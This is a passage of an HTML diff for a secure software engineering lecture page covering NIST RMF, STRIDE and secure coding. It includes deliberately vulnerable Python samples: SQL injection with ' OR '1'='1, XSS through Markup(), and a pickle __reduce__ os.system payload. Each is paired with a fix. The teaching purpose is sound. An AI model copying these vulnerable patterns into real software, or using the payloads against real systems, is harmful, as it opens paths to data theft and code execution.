+                            <line x1="350" y1="210" x2="405" y2="125" class="link-line" stroke-width="1.5"/>
+                        </svg>
+                    </div>
+
+                    <h3 class="mt-4">Security Risk Analysis (NIST RMF)</h3>
+                    <p class="mt-2">Risk analysis helps you answer the question, "What should we fix first?" A widely used model is the <strong>NIST (National Institute of Standards and Technology) Risk Management Framework (RMF)</strong>. It provides a disciplined 6-step process:</p>
+                    <ol class="list-decimal list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Categorize:</strong> Categorize the information system (Low, Moderate, High impact).</li>
+                        <li><strong>Select:</strong> Select baseline security controls based on the category.</li>
+                        <li><strong>Implement:</strong> Implement the security controls.</li>
+                        <li><strong>Assess:</strong> Assess the controls to determine if they are working.</li>
+                        <li><strong>Authorize:</strong> Make an informed, risk-based decision to authorize the system.</li>
+                        <li><strong>Monitor:</strong> Continuously monitor the security controls.</li>
+                    </ol>
+                    <p class="mt-2">For more information, visit the official NIST website: <a href="https://www.nist.gov/" target="_blank" rel="noopener noreferrer">https://www.nist.gov/</a></p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Risk Assessment</strong><br>
+                        <strong>Task:</strong> Prioritizing security work for a hospital's new patient portal.<br>
+                        <strong>Relation to Lecture:</strong> The team performs a risk assessment.<br>
+                        - <strong>Threat 1:</strong> A nurse's login credentials are stolen. <strong>Impact:</strong> High. <strong>Likelihood:</strong> Medium.<br>
+                        - <strong>Threat 2:</strong> The "Contact Us" page is vulnerable to being defaced. <strong>Impact:</strong> Low. <strong>Likelihood:</strong> High.<br>
+                        <strong>Conclusion:</strong> The team prioritizes fixing the authentication system (Threat 1) over the "Contact Us" page (Threat 2). The <em>impact</em> is the deciding factor.
+                    </div>
+
+                    <h3 class="mt-4">Threat Modeling (STRIDE)</h3>
+                    <p class="mt-2">Threat modeling is a structured approach to identifying and mitigating threats in a system <strong>during the design phase</strong>. A popular method is <strong>STRIDE</strong>, a mnemonic for the six categories of threats:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>S</strong>poofing: Pretending to be someone or something else.</li>
+                        <li><strong>T</strong>ampering: Modifying data without authorization.</li>
+                        <li><strong>R</strong>epudiation: Denying having performed an action.</li>
+                        <li><strong>I</strong>nformation Disclosure: Exposing information to unauthorized parties.</li>
+                        <li><strong>D</strong>enial of Service (DoS): Making a system or resource unavailable.</li>
+                        <li><strong>E</strong>levation of Privilege: Gaining capabilities without authorization.</li>
+                    </ul>
+                    <p class="mt-2">You typically create a <strong>DFD (Data Flow Diagram)</strong> of your system and then analyze each component for STRIDE threats.</p>
+                    
+                    <div class="overflow-x-auto mt-2">
+                        <table class="w-full text-left" style="border-collapse: collapse; border: 1px solid var(--border-main);">
+                            <thead>
+                                <tr style="background-color: var(--bg-accent);">
+                                    <th class="p-2" style="border: 1px solid var(--border-main);">Threat</th>
+                                    <th class="p-2" style="border: 1px solid var(--border-main);">Security Property Violated</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>S</strong>poofing</td><td class="p-2" style="border: 1px solid var(--border-main);">Authentication</td></tr>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>T</strong>ampering</td><td class="p-2" style="border: 1px solid var(--border-main);">Integrity</td></tr>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>R</strong>epudiation</td><td class="p-2" style="border: 1px solid var(--border-main);">Non-Repudiation</td></tr>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>I</strong>nformation Disclosure</td><td class="p-2" style="border: 1px solid var(--border-main);">Confidentiality</td></tr>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>D</strong>enial of Service</td><td class="p-2" style="border: 1px solid var(--border-main);">Availability</td></tr>
+                                <tr><td class="p-2" style="border: 1px solid var(--border-main);"><strong>E</strong>levation of Privilege</td><td class="p-2" style="border: 1px solid var(--border-main);">Authorization</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Threat Modeling a Simple Web App</strong><br>
+                        <strong>Task:</strong> Applying STRIDE to a simple Data Flow Diagram (DFD).<br>
+                        <strong>Relation to Lecture:</strong> The team creates this DFD for a user updating their profile.
+                    </div>
+                    <!-- Embedded SVG from the document -->
+                    <div class="my-4 flex justify-center">
+                        <svg width="600" height="200" xmlns="http://www.w3.org/2000/svg" style="background-color: var(--bg-main); border: 1px solid var(--border-main); border-radius: 8px; font-family: 'Inter', sans-serif;">
+                            <style>
+                                svg text { fill: var(--text-main); font-size: 12px; }
+                                svg .entity { fill: var(--bg-main); stroke: var(--text-main); }
+                                svg .entity-text { font-size: 14px; }
+                                svg .process { fill: #e0f7fa; stroke: var(--blue); }
+                                svg .process-text { fill: var(--text-main); }
+                                svg .datastore { fill: #fffde7; stroke: var(--text-main); }
+                                svg .datastore-text { fill: var(--text-main); }
+                                svg .flow-line { stroke: var(--text-main); }
+                                svg .flow-text { fill: var(--text-main); }
+                                svg #arrowhead polygon { fill: var(--text-main); }
+                            </style>
+                            <!-- External Entity: User -->
+                            <rect x="20" y="75" width="100" height="50" class="entity" stroke-width="2"/>
+                            <text x="70" y="105" text-anchor="middle" class="entity-text">User</text>
+                            <!-- Process: Web Server -->
+                            <circle cx="250" cy="100" r="50" class="process" stroke-width="2"/>
+                            <text x="250" y="105" text-anchor="middle" class="process-text">1.0</text>
+                            <text x="250" y="120" text-anchor="middle" class="process-text" font-size="12px">Web Server</text>
+                            <!-- Data Store: User Database -->
+                            <rect x="430" y="85" width="150" height="30" class="datastore" stroke-width="2"/>
+                            <line x1="430" y1="85" x2="430" y2="115" stroke="#333" stroke-width="2" transform="translate(-10, 0)" class="datastore"/>
+                            <text x="505" y="105" text-anchor="middle" class="datastore-text">D1: User Database</text>
+                            <!-- Data Flows -->
+                            <!-- User to Web Server -->
+                            <line x1="120" y1="100" x2="200" y2="100" class="flow-line" stroke-width="2" marker-end="url(#arrowhead)"/>
+                            <text x="160" y="90" text-anchor="middle" class="flow-text">Profile Update Request</text>
+                            <!-- Web Server to Database -->
+                            <line x1="300" y1="100" x2="420" y2="100" class="flow-line" stroke-width="2" marker-end="url(#arrowhead)"/>
+                            <text x="360" y="90" text-anchor="middle" class="flow-text">SQL Update Query</text>
+                            <!-- Arrowhead Definition -->
+                            <defs>
+                                <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="0" refY="3.5" orient="auto">
+                                    <polygon points="0 0, 10 3.5, 0 7"/>
+                                </marker>
+                            </defs>
+                        </svg>
+                    </div>
+                    <p class="mt-2"><strong>STRIDE Analysis:</strong></p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Data Flow ("Profile Update Request"):</strong>
+                            <ul class="list-disc list-outside ml-6 mt-1">
+                                <li><strong>(S)</strong> Can an attacker <strong>Spoof</strong> this request? <strong>Mitigation:</strong> Require a valid session token.</li>
+                                <li><strong>(T)</strong> Can an attacker <strong>Tamper</strong> with the data in transit? <strong>Mitigation:</strong> Use HTTPS (TLS encryption).</li>
+                                <li><strong>(I)</strong> Can an attacker <strong>read</strong> the data in transit? <strong>Mitigation:</strong> Use HTTPS (TLS encryption).</li>
+                            </ul>
+                        </li>
+                        <li><strong>Data Store ("User Database"):</strong>
+                            <ul class="list-disc list-outside ml-6 mt-1">
+                                <li><strong>(I)</strong> Can an unauthorized party get an <strong>Information Disclosure</strong> from the database? <strong>Mitigation:</strong> Encrypt sensitive data at rest.</li>
+                                <li><strong>(D)</strong> Can an attacker send so many queries it causes a <strong>Denial of Service</strong>? <strong>Mitigation:</strong> Implement rate-limiting.</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </details>
+            
+            <details>
+                <summary>6. The Front Line: Secure Coding Practices</summary>
+                <div>
+                    <p>This is where the principles meet the keyboard. Most vulnerabilities are not super-complex; they are simple, common coding errors.</p>
+                    <h3 class="mt-4">Understanding the Attack Surface</h3>
+                    <p class="mt-2">The <strong>Attack Surface</strong> describes all the different points where an attacker could get into a system and where they could get data out. Your goal is to <strong>minimize</strong> the attack surface. Every time you add a new feature, you are likely increasing the attack surface:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>A new API endpoint.</li>
+                        <li>A new user input form.</li>
+                        <li>A new port opened on a server.</li>
+                        <li>A new third-party library.</li>
+                    </ul>
+                    <p class="mt-2">Secure coding is the practice of defending these points of entry.</p>
+
+                    <h3 class="mt-4">SEI/CERT Top 10 Secure Coding Practices</h3>
+                    <p class="mt-2">The <strong>SEI (Software Engineering Institute) CERT</strong> coordination center provides excellent guidelines. For more information, visit the SEI: <a href="https://www.sei.cmu.edu/" target="_blank" rel="noopener noreferrer">https://www.sei.cmu.edu/</a></p>
+
+                    <h4 class="mt-4">1. Validate Input</h4>
+                    <p class="mt-2">This is the number one rule of secure coding. <strong>Never, ever trust data that comes from an external source.</strong> Assume all input is malicious until proven otherwise. Failure to validate input leads to the most common attacks, like <strong>SQL Injection</strong>.</p>
+                    
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Python Example: SQL Injection (Vulnerable vs. Secure)</strong><br>
+                        <strong>Task:</strong> A simple Python script that looks up a user in a database based on a username provided by a web form.<br>
+                        <strong>Relation to Lecture:</strong> This demonstrates the <strong>wrong</strong> way and the <strong>right</strong> way to handle user input when building a database query.
+                    </div>
+
+                    <h5 class="mt-4">VULNERABLE CODE (DO NOT USE):</h5>
+                    <div class="python-runner">
+                        <pre><code># Import the sqlite3 library for database operations
+import sqlite3
+# --- SIMULATION ---
+# Get a username from an 'untrusted' web form.
+# An attacker provides this malicious input:
+username_from_web = "' OR '1'='1"
+# Create a connection to an in-memory database
+db = sqlite3.connect(':memory:')
+# Get a cursor object to execute queries
+cursor = db.cursor()
+# Create a simple 'users' table
+cursor.execute("CREATE TABLE users (username TEXT, password TEXT, admin INTEGER)")
+# Insert some legitimate users
+cursor.execute("INSERT INTO users VALUES ('alice', 'pa$$w0rd', 0)")
+cursor.execute("INSERT INTO users VALUES ('bob', 'secr3t', 0)")
+cursor.execute("INSERT INTO users VALUES ('admin', 'adminpass', 1)")
+# --- END SIMULATION ---
+
+# !!! VULNERABLE PART !!!
+# This code builds a query by simply pasting the user input string into the query.
+# This is called string formatting or string interpolation.
+query = f"SELECT * FROM users WHERE username = '{username_from_web}'"
+
+# Log the query that will be run
+print(f"Executing query: {query}")
+
+# Execute the maliciously crafted query
+cursor.execute(query)
+# Fetch all the results
+results = cursor.fetchall()
+
+# The attacker's input ' OR '1'='1' made the WHERE clause TRUE for EVERY row.
+# As a result, they have dumped the entire users table.
+print("\n--- Results ---")
+for row in results:
+    print(row)
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>Executing query: SELECT * FROM users WHERE username = '' OR '1'='1'
+
+--- Results ---
+('alice', 'pa$$w0rd', 0)
+('bob', 'secr3t', 0)
+('admin', 'adminpass', 1)</code></pre></div>
+                    </div>
+
+                    <h5 class="mt-4">SECURE CODE (The Correct Way):</h5>
+                    <div class="python-runner">
+                        <pre><code># Import the sqlite3 library for database operations
+import sqlite3
+# --- SIMULATION ---
+# Get a username from an 'untrusted' web form.
+# An attacker provides the same malicious input:
+username_from_web = "' OR '1'='1" 
+# Create a connection to an in-memory database
+db = sqlite3.connect(':memory:')
+# Get a cursor object to execute queries
+cursor = db.cursor()
+# Create a simple 'users' table
+cursor.execute("CREATE TABLE users (username TEXT, password TEXT, admin INTEGER)")
+# Insert some legitimate users
+cursor.execute("INSERT INTO users VALUES ('alice', 'pa$$w0rd', 0)")
+# --- END SIMULATION ---
+
+# !!! SECURE PART !!!
+# This code uses a 'parameterized query' (also called 'prepared statements').
+# The '?' is a placeholder for a value.
+# The query structure is sent to the database first.
+query = "SELECT * FROM users WHERE username = ?"
+
+# The untrusted input is sent *separately* as a tuple (or list).
+# The database engine *safely* inserts the value into the placeholder.
+# It treats the attacker's input as a *single, literal string*, not as part of the SQL command.
+values = (username_from_web,)
+
+# Log the query and values
+print(f"Executing query: {query}")
+print(f"With values: {values}")
+
+# Execute the query safely
+cursor.execute(query, values)
+# Fetch all the results
+results = cursor.fetchall()
+
+# No user has that literal name, so no results are returned. The attack fails.
+print("\n--- Results ---")
+for row in results:
+    print(row)
+if not results:
+    print("No user found.")
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>Executing query: SELECT * FROM users WHERE username = ?
+With values: (&quot;' OR '1'='1'&quot;,)
+
+--- Results ---
+No user found.</code></pre></div>
+                    </div>
+
+                    <h4 class="mt-6">2. Heed Compiler Warnings</h4>
+                    <p class="mt-2">Compilers and analysis tools are your best friends. They can often detect potential security flaws. <strong>Do not ignore warnings.</strong> Treat warnings as errors.</p>
+
+                    <h4 class="mt-4">3. Architect and Design for Security Policies</h4>
+                    <p class="mt-2">Security must be designed in, not bolted on. Your system's architecture should enforce security. (e.g., A web server should be in a separate network zone (DMZ) from the internal database).</p>
+
+                    <h4 class="mt-4">4. Keep it Simple</h4>
+                    <p class="mt-2">Complexity is the enemy of security. A simple, small design has a smaller attack surface and is easier to analyze and test.</p>
+                    
+                    <h4 class="mt-4">5. Default Deny</h4>
+                    <p class="mt-2">This is a core principle for access control. By default, a user should have <strong>no</strong> access to any resource. They must be <strong>explicitly</strong> granted permission.</p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Default Deny</strong><br>
+                        <strong>Insecure (Default Allow):</strong> The server automatically gives a new user "Read" access to all folders, and the admin has to <em>remove</em> access to sensitive folders. The admin might forget one.<br>
+                        <strong>Secure (Default Deny):</strong> The user is added but has <em>zero</em> permissions by default. The project manager must <em>explicitly</em> grant them "Read" access to the 'Documentation' folder.
+                    </div>
+
+                    <h4 class="mt-4">6. Adhere to the Principle of Least Privilege</h4>
+                    <p class="mt-2">A process, user, or program should only have the <strong>bare minimum</strong> permissions necessary to perform its specific job.</p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Principle of Least Privilege</strong><br>
+                        <strong>Task:</strong> A web server script that only needs to read from a database.<br>
+                        <strong>Relation to Lecture:</strong> The script's database account <em>should not</em> be the 'admin' account. It should be a special account (e.g., 'web_reader') that ONLY has <em>SELECT</em> privileges on the <em>specific tables</em> it needs to read. This way, even if an attacker compromises the web server, they <em>cannot</em> use that script's credentials to delete the database.
+                    </div>
+
+                    <h4 class="mt-4">7. Sanitize Data Sent to Other Systems</h4>
+                    <p class="mt-2">This is the twin of "Validate Input." Just as you don't trust data <em>coming in</em>, you must clean data <em>going out</em> to another system (like a user's web browser). Failure to do this leads to attacks like <strong>Cross-Site Scripting (XSS)</strong>.</p>
+                    
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Python Example: Cross-Site Scripting (XSS) (Vulnerable vs. Secure)</strong><br>
+                        <strong>Task:</strong> A simple web application (using the Flask framework) that displays user comments on a page.<br>
+                        <strong>Relation to Lecture:</strong> This shows how failing to sanitize output allows an attacker to inject a malicious script into the page, which then runs in <em>other users'</em> browsers. (Note: These examples are conceptual and won't run a live server here).
+                    </div>
+
+                    <h5 class="mt-4">VULNERABLE CODE (DO NOT USE):</h5>
+                    <div class="python-runner">
+                        <pre><code># Import the Flask library
+from flask import Flask, Markup
+# Create a new Flask web app
+app = Flask(__name__)
+
+# A "database" of comments.
+comments = ["This is a great post!"]
+# An attacker submits a new comment with a malicious script.
+attacker_comment = '&lt;script&gt;alert(&quot;You have been hacked!&quot;);&lt;/script&gt;'
+comments.append(attacker_comment)
+
+@app.route('/')
+def homepage():
+    # --- VULNERABLE PART ---
+    html = "&lt;h1&gt;User Comments&lt;/h1&gt;&lt;ul&gt;"
+    for comment in comments:
+        # The 'Markup()' function tells the template engine
+        # "This string is safe, render it as raw HTML."
+        # We are *trusting* the comment, which is a critical mistake.
+        html += f"&lt;li&gt;{Markup(comment)}&lt;/li&gt;"
+    html += "&lt;/ul&gt;"
+    # The browser will receive the &lt;script&gt; tag and execute it.
+    return html
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>&lt;!-- Browser would show an alert box pop-up: 'You have been hacked!' --&gt;
+&lt;!-- The page content would look like: --&gt;
+&lt;h1&gt;User Comments&lt;/h1&gt;
+&lt;ul&gt;
+    &lt;li&gt;This is a great post!&lt;/li&gt;
+    &lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;</code></pre></div>
+                    </div>
+
+                    <h5 class="mt-4">SECURE CODE (The Correct Way):</h5>
+                    <div class="python-runner">
+                        <pre><code>from flask import Flask, render_template_string
+
+app = Flask(__name__)
+
+comments = ["This is a great post!"]
+attacker_comment = '&lt;script&gt;alert("You have been hacked!");&lt;/script&gt;'
+comments.append(attacker_comment)
+
+@app.route('/')
+def homepage():
+    # --- SECURE PART ---
+    # Modern template engines like Jinja2 (used by Flask)
+    # automatically 'escape' all variables by default.
+    template = """
+    &lt;h1&gt;User Comments (Secure)&lt;/h1&gt;
+    &lt;ul&gt;
+    {% for comment in comment_list %}
+        &lt;li&gt;{{ comment }}&lt;/li&gt;
+    {% endfor %}
+    &lt;/ul&gt;
+    """
+    # The template engine will transform the attacker's string:
+    # FROM: &lt;script&gt;alert(...);&lt;/script&gt;
+    # TO:   &amp;lt;script&amp;gt;alert(...);&amp;lt;/script&amp;gt;
+    # The browser will *display* this harmless text, not *execute* it.
+    return render_template_string(template, comment_list=comments)
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>&lt;!-- Browser renders the following text harmlessly: --&gt;
+&lt;h1&gt;User Comments (Secure)&lt;/h1&gt;
+&lt;ul&gt;
+    &lt;li&gt;This is a great post!&lt;/li&gt;
+    &lt;li&gt;&amp;lt;script&amp;gt;alert(&amp;quot;You have been hacked!&amp;quot;);&amp;lt;/script&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;</code></pre></div>
+                    </div>
+
+                    <h4 class="mt-6">8. Practice Defense in Depth</h4>
+                    <p class="mt-2">Do not rely on a single defensive mechanism. Assume that any one line of defense will fail. Use multiple, overlapping layers of security.</p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Defense in Depth</strong><br>
+                        <strong>Task:</strong> Protecting a company's sensitive database.<br>
+                        <strong>Layers:</strong><br>
+                        - <strong>Layer 1 (Network):</strong> A firewall blocks all access to the database server, except from the web server.<br>
+                        - <strong>Layer 2 (Application):</strong> The web application uses parameterized queries to prevent SQLi.<br>
+                        - <strong>Layer 3 (Access Control):</strong> The web application connects using a least-privilege account.<br>
+                        - <strong>Layer 4 (Data):</strong> Sensitive data is encrypted at rest.<br>
+                        - <strong>Layer 5 (Monitoring):</strong> An alert system notifies an admin of suspicious activity.
+                    </div>
+
+                    <h4 class="mt-4">9. Use Effective Quality Assurance Techniques</h4>
+                    <p class="mt-2">Security is a part of quality. Your testing (QA) process must include security testing:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Static Analysis (SAST):</strong> Scan source code for known vulnerability patterns.</li>
+                        <li><strong>Dynamic Analysis (DAST):</strong> Attack your running application to find flaws.</li>
+                        <li><strong>Code Reviews:</strong> Have another human review all code for flaws.</li>
+                    </ul>
+
+                    <h4 class="mt-4">10. Adopt a Secure Coding Standard</h4>
+                    <p class="mt-2">Don't make up the rules as you go. Adopt a formal standard. Good places to start are:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>OWASP Top 10:</strong> A list of the 10 most critical web application security risks. Visit them: <a href="https://owasp.org/" target="_blank" rel="noopener noreferrer">https://owasp.org/</a></li>
+                        <li><strong>SEI/CERT Coding Standards:</strong> Detailed, language-specific rules.</li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>Additional Major Vulnerability: Insecure Deserialization</summary>
+                <div>
+                    <p>This is a common and dangerous vulnerability in object-oriented languages like Python, Java, and C#.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Serialization:</strong> Converting an object into a string or byte stream to be saved or sent.</li>
+                        <li><strong>Deserialization:</strong> Turning the string/byte stream back into an object.</li>
+                        <li><strong>Insecure Deserialization:</strong> Happens when an application deserializes data from an untrusted source, and the process of "re-building" the object can be manipulated to execute arbitrary code.</li>
+                    </ul>
+
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Python Example: Insecure Deserialization (Vulnerable vs. Secure)</strong><br>
+                        <strong>Task:</strong> An application saves a user's preferences object to a file and loads it back. The attacker manages to replace the user's preference file with a malicious one.<br>
+                        <strong>Relation to Lecture:</strong> This demonstrates why you should <strong>never</strong> use "unsafe" serialization formats like Python's <code>pickle</code> module with data you don't 100% control.
+                    </div>
+
+                    <h5 class="mt-4">VULNERABLE CODE (DO NOT USE):</h5>
+                    <div class="python-runner">
+                        <pre><code># Import the pickle library, which is *not* secure
+import pickle
+import os
+
+# --- ATTACKER'S PAYLOAD ---
+# The attacker creates a malicious class.
+# When an instance of this class is deserialized by pickle,
+# its '__reduce__' method is called.
+class MaliciousPayload:
+    def __reduce__(self):
+        command = 'echo "!!! ATTACKER CODE IS RUNNING !!!"'
+        return (os.system, (command,))
+
+# --- SIMULATION ---
+# The attacker creates a 'malicious' pickle file.
+malicious_data = pickle.dumps(MaliciousPayload())
+print(f"Malicious pickle data (bytes): b'...'")
+
+# --- VULNERABLE PART ---
+# The server thinks it's loading a normal user preference file.
+# It uses 'pickle.loads()' on the untrusted data.
+print("\nServer is loading 'user_prefs.pkl'...")
+try:
+    # As soon as 'loads' is called, the __reduce__ method
+    # on the attacker's object is executed.
+    loaded_object = pickle.loads(malicious_data)
+    print("\n...Loading complete.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>Malicious pickle data (bytes): b'...'
+
+Server is loading 'user_prefs.pkl'...
+!!! ATTACKER CODE IS RUNNING !!!
+
+...Loading complete.</code></pre></div>
+                    </div>
+
+                    <h5 class="mt-4">SECURE CODE (The Correct Way):</h5>
+                    <div class="python-runner">
+                        <pre><code># Import the json library, which is secure.
+# json only serializes *data* (strings, numbers, lists, dicts).
+# It does NOT serialize code, classes, or functions.
+import json
+
+# --- SIMULATION ---
+# A legitimate user preference object (just data).
+user_prefs = {
+    "username": "alice",
+    "theme": "dark",
+    "notifications": True
+}
+safe_data = json.dumps(user_prefs)
+print(f"Safe JSON data (string): {safe_data}\n")
+
+# An attacker tries to create a malicious JSON string.
+malicious_string = '{"attack": "os.system(\'echo HACKED\')"}'
+print(f"Malicious JSON data (string): {malicious_string}\n")
+
+# --- SECURE PART ---
+# The server loads the attacker's string using 'json.loads()'.
+print("Server is loading 'user_prefs.json'...")
+try:
+    loaded_data = json.loads(malicious_string)
+    
+    # The 'json.loads()' function *parses data*.
+    # It does not *execute* code.
+    # The result is just a simple Python dictionary.
+    print("\n...Loading complete.")
+    print(f"Type of loaded data: {type(loaded_data)}")
+    print(f"Loaded data content: {loaded_data}")
+    
+    # The server might see the 'attack' key, but no code is ever run.
+    # The attack is completely neutralized.
+    
+except Exception as e:
+    print(f"An error occurred: {e}")
+</code></pre>
+                        <div class="python-runner-controls flex space-x-2">
+                            <button class="btn btn-sm btn-run">Run</button>
+                            <button class="btn btn-sm btn-secondary btn-clear">Clear</button>
+                        </div>
+                        <div class="python-runner-output"><pre><code>Safe JSON data (string): {&quot;username&quot;: &quot;alice&quot;, &quot;theme&quot;: &quot;dark&quot;, &quot;notifications&quot;: true}
+
+Malicious JSON data (string): {&quot;attack&quot;: &quot;os.system('echo HACKED')&quot;}
+
+Server is loading 'user_prefs.json'...
+
+...Loading complete.
+Type of loaded data: &lt;class 'dict'&gt;
+Loaded data content: {'attack': &quot;os.system('echo HACKED')&quot;}</code></pre></div>
+                    </div>
+                    <p class="mt-4 font-bold">Key Takeaway: Use data-only formats like JSON or XML for untrusted data. Never use <code>pickle</code> (Python), <code>Java Serialization</code>, or <code>PHP serialize()</code> on data you don't control.</p>
+                </div>
+            </details>
+
+            <details>
+                <summary>7. Measuring and Improving Security</summary>
+                <div>
+                    <p>How do you know if you are getting better at security?</p>
+                    <h3 class="mt-4">Security Measurement</h3>
+                    <p class="mt-2">You cannot improve what you cannot measure. We can track useful metrics:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Vulnerability Counts:</strong> How many vulnerabilities are found (per release, per line of code)?</li>
+                        <li><strong>Time to Fix:</strong> How long does it take (on average) from when a vulnerability is reported to when it is patched?</li>
+                        <li><strong>Attack Surface:</strong> Is your attack surface (number of open ports, API endpoints) growing or shrinking?</li>
+                        <li><strong>Defect Origin:</strong> Are most of your security bugs found in design, code, or deployment?</li>
+                    </ul>
+
+                    <h3 class="mt-4">Maturity Models</h3>
+                    <p class="mt-2">Instead of just measuring, you can assess your organization's overall <strong>process maturity</strong>.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>BSIMM (Building Security in Maturity Model):</strong> This is a <em>descriptive</em> model. It studies what <em>real</em> organizations are <em>actually</em> doing for software security.</li>
+                        <li><strong>OWASP SAMM (Software Assurance Maturity Model):</strong> This is a <em>prescriptive</em> model. It provides a concrete roadmap for organizations to follow to "level up" their security practices. You can learn more here: <a href="https://owasp.org/www-project-samm/" target="_blank" rel="noopener noreferrer">https://owasp.org/www-project-samm/</a></li>
+                    </ul>
+                </div>
+            </details>
+            
+            <details>
+                <summary>8. Conclusion & Key Takeaways</summary>
+                <div>
+                    <h3 class="mt-4">Part 1: Principles of Practice</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>Software engineering is a disciplined practice guided by core principles.</li>
+                        <li>The best software is built by effective, agile teams that focus on quality, manage change, and communicate clearly.</li>
+                        <li>Principles like "Divide and Conquer," "Modularity," and "Abstraction" are the foundation for building complex systems that are <em>maintainable</em>.</li>
+                    </ul>
+                    <h3 class="mt-4">Part 2: Secure Software Engineering</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>Maintainability and <strong>Security</strong> are linked. Simple, modular, well-designed code is easier to secure.</li>
+                        <li>Security is not an add-on; it must be built in from the very beginning.</li>
+                        <li><strong>Think Like an Attacker:</strong> Use tools like Misuse Cases and Threat Modeling (STRIDE) to find flaws <em>before</em> you write code.</li>
+                        <li><strong>Prioritize with Risk:</strong> Use a Risk Management Framework (like NIST RMF) to focus your efforts on what matters most.</li>
+                        <li><strong>The Secure Coding Golden Rule:</strong> <strong>Validate</strong> all <strong>input</strong>, and <strong>sanitize</strong> all <strong>output</strong>. This single practice prevents the most common and dangerous attacks.</li>
+                        <li><strong>Defense in Depth:</strong> Never trust a single security control. Layer your defenses.</li>
+                        <li><strong>Never Stop Improving:</strong> Use metrics and maturity models (like OWASP SAMM) to continuously improve your security posture.</li>
+                    </ul>
+                </div>
+            </details>
+        </section>
+
+        <!-- ****************** EXERCISES SECTION ****************** -->
+        <section id="exercises-content" class="main-content-page space-y-8">
+            <h2 class="text-3xl font-bold border-b-2 pb-2" style="border-color: var(--border-main);">Exercises</h2>
+            
+            <!-- Exercise 1 -->
+            <details class="exercise" data-exercise-id="1">
+                <summary>Exercise 1: Create a Misuse Case</summary>
+                <div>
+                    <p class="mt-2">Based on the "Misuse Case Diagram" example in the lecture, draw or describe a misuse case for a <strong>"Password Reset"</strong> feature.
+                    <br>
+                    Identify at least two (2) misuse cases (threats) from an attacker's perspective and list one (1) mitigation for each.</p>
+                    <div class="mt-4">
+                        <button class="btn btn-sm btn-import">Import Content</button>
+                        <span class="text-sm ml-2" style="color: var(--text-muted);">(Import images, .txt, .md, or .html files. For other types, please copy/paste.)</span>
+                    </div>
+                    <div class="answer-box" contenteditable="true" aria-label="Answer box for Exercise 1"></div>
+                </div>
+            </details>
+
+            <!-- Exercise 2 -->
+            <details class="exercise" data-exercise-id="2">
+                <summary>Exercise 2: Apply STRIDE</summary>
+                <div>
+                    <p class="mt-2">Look back at the "Threat Modeling a Simple Web App" example (the DFD). The analysis in the lecture identified threats for the <em>Data Flow</em> and <em>Data Store</em>.</p>
+                    <p class="mt-2">Your task: Analyze the <strong>Process</strong> itself (the "1.0 Web Server" circle). Using STRIDE, identify at least three (3) potential threats and their corresponding mitigations.</p>
+                    <div class="mt-4">
+                        <button class="btn btn-sm btn-import">Import Content</button>
